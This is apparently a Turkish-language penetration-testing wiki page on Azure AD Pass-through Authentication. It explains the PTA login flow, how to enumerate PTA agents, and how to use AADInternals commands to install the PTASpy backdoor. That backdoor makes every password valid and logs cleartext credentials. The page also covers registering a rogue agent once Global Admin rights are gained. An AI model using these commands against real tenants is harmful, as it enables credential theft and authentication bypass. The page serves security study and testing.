# Az - PTA - Pass-through Authentication

{{#include ../../../../banners/hacktricks-training.md}}

## Temel Bilgiler

[Belgelerden:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-pta) Microsoft Entra geçiş kimlik doğrulaması, kullanıcılarınızın **aynı şifreleri kullanarak hem yerel hem de bulut tabanlı uygulamalara giriş yapmalarını** sağlar. Bu özellik, kullanıcılarınıza daha iyi bir deneyim sunar - hatırlanacak bir şifre daha az ve IT yardım masası maliyetlerini azaltır çünkü kullanıcılarınızın giriş yapmayı unutma olasılığı daha düşüktür. Kullanıcılar Microsoft Entra ID kullanarak giriş yaptığında, bu özellik kullanıcıların şifrelerini doğrudan yerel Active Directory'nizle doğrular.

PTA'da **kimlikler** **senkronize** edilir ancak **şifreler** PHS'deki gibi **senkronize edilmez**.

Kimlik doğrulama yerel AD'de doğrulanır ve bulutla iletişim, **yerel bir sunucuda** çalışan bir **kimlik doğrulama ajanı** tarafından gerçekleştirilir (yerel DC'de olması gerekmez).

### Kimlik Doğrulama Akışı

<figure><img src="../../../../images/image (92).png" alt=""><figcaption></figcaption></figure>

1. Kullanıcı **giriş yapmak** için **Azure AD**'ye yönlendirilir, burada **kullanıcı adı** ve **şifre** gönderir.
2. **Kimlik bilgileri** **şifrelenir** ve Azure AD'de bir **kuvvet** içine yerleştirilir.
3. **Yerel kimlik doğrulama ajanı**, kuyruktan **kimlik bilgilerini** toplar ve **şifreler**. Bu ajana **"Geçiş kimlik doğrulama ajanı"** veya **PTA ajanı** denir.
4. **Ajan**, kimlik bilgilerini **yerel AD** ile **doğrular** ve **yanıtı** **geri** Azure AD'ye gönderir; eğer yanıt olumluysa, kullanıcının **girişini tamamlar**.

> [!WARNING]
> Eğer bir saldırgan **PTA'yı tehlikeye atarsa**, kuyruktaki tüm **kimlik bilgilerini** (şifrelenmemiş olarak) **görebilir**.\
> Ayrıca AzureAD'ye **herhangi bir kimlik bilgisini doğrulayabilir** (Skeleton key'e benzer bir saldırı).

### Sayım

Entra ID'den:
```bash
az rest --url 'https://graph.microsoft.com/beta/onPremisesPublishingProfiles/authentication/agentGroups?$expand=agents'
# Example response:
{
"@odata.context": "https://graph.microsoft.com/beta/$metadata#onPremisesPublishingProfiles('authentication')/agentGroups(agents())",
"value": [
{
"agents": [
{
"externalIp": "20.121.45.57",
"id": "4a000eb4-9a02-49e4-b67f-f9b101f8f14c",
"machineName": "ConnectSync.hacktricks-con.azure",
"status": "active",
"supportedPublishingTypes": [
"authentication"
]
}
],
"displayName": "Default group for Pass-through Authentication",
"id": "d372d40f-3f81-4824-8b9e-6028182db58e",
"isDefault": true,
"publishingType": "authentication"
}
]
}
```
Ajanının yerel sunucuda çalışıp çalışmadığını kontrol edin:
```bash
Get-Service -Name "AzureADConnectAuthenticationAgent"
```
## Pivoting

Eğer **PTA** **ajanı** çalışan **Azure AD Connect sunucusu** üzerinde **admin** erişiminiz varsa, **ALL the passwords** girilen **doğrulamak** için bir **backdoor** **eklemek** üzere **AADInternals** modülünü kullanabilirsiniz (böylece tüm şifreler kimlik doğrulama için geçerli olacaktır):
```bash
Install-Module AADInternals -RequiredVersion 0.9.3
Import-Module AADInternals
Install-AADIntPTASpy # Install the backdoor, it'll save all the passwords in a file
Get-AADIntPTASpyLog -DecodePasswords # Read the file or use this to read the passwords in clear-text

Remove-AADIntPTASpy # Remove the backdoor
```
> [!NOTE]
> Eğer **kurulum başarısız olursa**, bu muhtemelen eksik [Microsoft Visual C++ 2015 Redistributables](https://download.microsoft.com/download/6/A/A/6AA4EDFF-645B-48C5-81CC-ED5963AEAD48/vc_redist.x64.exe) nedeniyle olabilir.

Bu arka kapı:

- Gizli bir klasör oluşturur `C:\PTASpy`
- `PTASpy.dll` dosyasını `C:\PTASpy`'ye kopyalar
- `PTASpy.dll` dosyasını `AzureADConnectAuthenticationAgentService` sürecine enjekte eder

> [!NOTE]
> AzureADConnectAuthenticationAgent servisi yeniden başlatıldığında, PTASpy “boşaltılır” ve yeniden kurulması gerekir.

> [!CAUTION]
> Bulutta **GA ayrıcalıkları** alındıktan sonra, **yeni bir PTA ajanı kaydetmek** mümkün olup, **önceki** adımları **tekrar** ederek **herhangi bir şifre ile kimlik doğrulaması yapmak** ve ayrıca, **şifreleri düz metin olarak almak** mümkündür.

### Seamless SSO

PTA ile Seamless SSO kullanmak mümkündür, bu da diğer kötüye kullanımlara açıktır. Bunu kontrol edin:

{{#ref}}
seamless-sso.md
{{#endref}}

## References

- [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta)
- [https://aadinternals.com/post/on-prem_admin/#pass-through-authentication](https://aadinternals.com/post/on-prem_admin/#pass-through-authentication)

{{#include ../../../../banners/hacktricks-training.md}}
